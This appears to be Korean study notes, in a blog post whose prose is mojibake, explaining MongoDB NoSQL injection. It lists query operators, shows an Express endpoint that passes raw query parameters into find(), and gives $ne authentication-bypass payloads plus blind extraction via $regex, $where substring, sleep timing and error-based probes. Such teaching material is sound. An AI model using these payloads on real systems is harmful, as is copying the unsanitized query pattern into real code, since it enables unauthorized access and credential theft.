---
title: "[2025-07-12] NoSQL Injection"
excerpt: "NoSQL Injection ê°œë… ì •ë¦¬"

categories:
  - Justice
tags:
  - [NoSQL Injection]

permalink: /Justice/[2025-07-12] NoSQL Injection/

toc: true
toc_sticky: true

date: 2025-07-12
last_modified_at: 2025-07-12
---

## ğŸ¦¥ ë³¸ë¬¸

### ì •ì˜

NoSQL ë°ì´í„°ë² ì´ìŠ¤ì— ëŒ€í•´ ì´ìš©ìì˜ ì…ë ¥ê°’ì´ ì¿¼ë¦¬ ê°ì²´ì— ê·¸ëŒ€ë¡œ í¬í•¨ë˜ë©´ì„œ ì¿¼ë¦¬ êµ¬ì¡°ë¥¼ ì¡°ì‘í•˜ëŠ” ê³µê²© 

### NoSQL ì—°ì‚°ì

| Name | Description |
| --- | --- |
| `$eq` | ì§€ì •ëœ ê°’ê³¼ ê°™ì€ ê°’ì„ ì°¾ìŠµë‹ˆë‹¤. **(equal)** |
| `$in` | ë°°ì—´ ì•ˆì˜ ê°’ë“¤ê³¼ ì¼ì¹˜í•˜ëŠ” ê°’ì„ ì°¾ìŠµë‹ˆë‹¤. **(in)** |
| `$ne` | ì§€ì •ëœ ê°’ê³¼ ê°™ì§€ ì•Šì€ ê°’ì„ ì°¾ìŠµë‹ˆë‹¤. **(not equal)** |
| `$nin` | ë°°ì—´ ì•ˆì˜ ê°’ë“¤ê³¼ ì¼ì¹˜í•˜ì§€ ì•ŠëŠ” ê°’ì„ ì°¾ìŠµë‹ˆë‹¤. **(not in)** |
| `$and` | ë…¼ë¦¬ì  AND, ê°ê°ì˜ ì¿¼ë¦¬ë¥¼ ëª¨ë‘ ë§Œì¡±í•˜ëŠ” ë¬¸ì„œê°€ ë°˜í™˜ë©ë‹ˆë‹¤. |
| `$not` | ì¿¼ë¦¬ ì‹ì˜ íš¨ê³¼ë¥¼ ë°˜ì „ì‹œí‚µë‹ˆë‹¤. ì¿¼ë¦¬ ì‹ê³¼ ì¼ì¹˜í•˜ì§€ ì•ŠëŠ” ë¬¸ì„œë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤. |
| `$nor` | ë…¼ë¦¬ì  NOR, ê°ê°ì˜ ì¿¼ë¦¬ë¥¼ ëª¨ë‘ ë§Œì¡±í•˜ì§€ ì•ŠëŠ” ë¬¸ì„œê°€ ë°˜í™˜ë©ë‹ˆë‹¤. |
| `$or` | ë…¼ë¦¬ì  OR, ê°ê°ì˜ ì¿¼ë¦¬ ì¤‘ í•˜ë‚˜ ì´ìƒ ë§Œì¡±í•˜ëŠ” ë¬¸ì„œê°€ ë°˜í™˜ë©ë‹ˆë‹¤. |
| `$exists` | ì§€ì •ëœ í•„ë“œê°€ ìˆëŠ” ë¬¸ì„œë¥¼ ì°¾ìŠµë‹ˆë‹¤. |
| `$type` | ì§€ì •ëœ í•„ë“œê°€ ì§€ì •ëœ ìœ í˜•ì¸ ë¬¸ì„œë¥¼ ì„ íƒí•©ë‹ˆë‹¤. |
| `$expr` | ì¿¼ë¦¬ ì–¸ì–´ ë‚´ì—ì„œ ì§‘ê³„ ì‹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. |
| `$regex` | ì§€ì •ëœ ì •ê·œì‹ê³¼ ì¼ì¹˜í•˜ëŠ” ë¬¸ì„œë¥¼ ì„ íƒí•©ë‹ˆë‹¤. |
| `$text` | ì§€ì •ëœ í…ìŠ¤íŠ¸ë¥¼ ê²€ìƒ‰í•©ë‹ˆë‹¤. |
| `$where` | JavaScript í‘œí˜„ì‹ì„ ë§Œì¡±í•˜ëŠ” ë¬¸ì„œì™€ ì¼ì¹˜í•©ë‹ˆë‹¤. |

### ì˜ˆì‹œ

ì•„ë˜ì˜ ì½”ë“œëŠ” ì…ë ¥ ë°›ì€ uidì™€ upwì— í•´ë‹¹í•˜ëŠ” ë°ì´í„°ë¥¼ ì°¾ê³  ì¶œë ¥í•˜ëŠ” ì½”ë“œ. 

```jsx
const express = require('express');
const app = express();
const mongoose = require('mongoose');
const db = mongoose.connection;
mongoose.connect('mongodb://localhost:27017/', { useNewUrlParser: true, useUnifiedTopology: true });
app.get('/query', function(req,res) {
    db.collection('user').find({
        'uid': req.query.uid,
        'upw': req.query.upw
    }).toArray(function(err, result) {
        if (err) throw err;
        res.send(result);
  });
});
const server = app.listen(3000, function(){
    console.log('app.listen');
});
```

ì—°ì‚°ìë¥¼ ì‚¬ìš©í•˜ì—¬ ê³„ì •ì„ ë°›ì•„ì˜¬ ìˆ˜ ìˆë‹¤

```jsx
query?uid[$ne]=a&upw[$ne]=a //ne : not equal. aê°€ ì•„ë‹Œ ê³„ì •
=> [{"_id":"5ebb81732b75","uid":"admin","upw":"pw"}]

ë˜ëŠ”
query?uid={"$ne": null }&upw={"$ne": null } // nullì´ ì•„ë‹Œ ê³„ì • 
```

## Blind NoSQL Injection

### ì •ì˜

ê³µê²©ìê°€ ì‘ë‹µì˜ ë³€í™”ë¥¼ í†µí•´ ê°„ì ‘ì ìœ¼ë¡œ NoSQL ê²°ê³¼ë¥¼ ì¶”ì¸¡í•˜ëŠ” ë°©ì‹ì˜ ê³µê²© 

### ì—°ì‚°ì ì¢…ë¥˜ ë° ê³µê²© ë°©ë²•

- $regex : ì •ê·œì‹ì„ ì‚¬ìš©í•˜ì—¬ ì¼ì¹˜í•˜ëŠ” ë°ì´í„° ì¡°íšŒ

```jsx
> db.user.find({upw: {$regex: "^a"}})
> db.user.find({upw: {$regex: "^b"}})
> db.user.find({upw: {$regex: "^c"}})
...
> db.user.find({upw: {$regex: "^g"}})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
```

- $where : JS í‘œí˜„ì‹ì„ ë§Œì¡±í•˜ëŠ” ë°ì´í„° ì¡°íšŒ. í•„ë“œ ê°’ì—ëŠ” ì‚¬ìš©í•  ìˆ˜ ì—†ìŒ

```jsx
> db.user.find({$where:"return 1==1"})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
> db.user.find({uid:{$where:"return 1==1"}})
error: {
	"$err" : "Can't canonicalize query: BadValue $where cannot be applied to a field",
	"code" : 17287
}
```

- substring : í•œ ê¸€ìì”© ë¹„êµí•˜ì—¬ ë°ì´í„° íƒìƒ‰

```jsx
> db.user.find({$where: "this.upw.substring(0,1)=='a'"})
> db.user.find({$where: "this.upw.substring(0,1)=='b'"})
> db.user.find({$where: "this.upw.substring(0,1)=='c'"})
...
> db.user.find({$where: "this.upw.substring(0,1)=='g'"})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
```

- Sleep

```jsx
db.user.find({$where: `this.uid=='${req.query.uid}'&&this.upw=='${req.query.upw}'`});

/?uid=guest'&&this.upw.substring(0,1)=='a'&&sleep(5000)&&'1
/?uid=guest'&&this.upw.substring(0,1)=='b'&&sleep(5000)&&'1
/?uid=guest'&&this.upw.substring(0,1)=='c'&&sleep(5000)&&'1
...
/?uid=guest'&&this.upw.substring(0,1)=='g'&&sleep(5000)&&'1
=> ì‹œê°„ ì§€ì—° ë°œìƒ.

```

- Error based Injection : ì•„ë˜ëŠ” ì°¸ì¼ ê²½ìš°ì— ì´ìƒí•œ ì½”ë“œ asdfë¥¼ ì§‘ì–´ ë„£ì–´ ì—ëŸ¬ë¥¼ ë°œìƒì‹œí‚¨ë‹¤.

```jsx
> db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='g'&&asdf&&'1'&&this.upw=='${upw}'"});
error: {
	"$err" : "ReferenceError: asdf is not defined near '&&this.upw=='${upw}'' ",
	"code" : 16722
}
// this.upw.substring(0,1)=='g' ê°’ì´ ì°¸ì´ê¸° ë•Œë¬¸ì— asdf ì½”ë“œë¥¼ ì‹¤í–‰í•˜ë‹¤ ì—ëŸ¬ ë°œìƒ
> db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='a'&&asdf&&'1'&&this.upw=='${upw}'"});
// this.upw.substring(0,1)=='a' ê°’ì´ ê±°ì§“ì´ê¸° ë•Œë¬¸ì— ë’¤ì— ì½”ë“œê°€ ì‘ë™í•˜ì§€ ì•ŠìŒ
```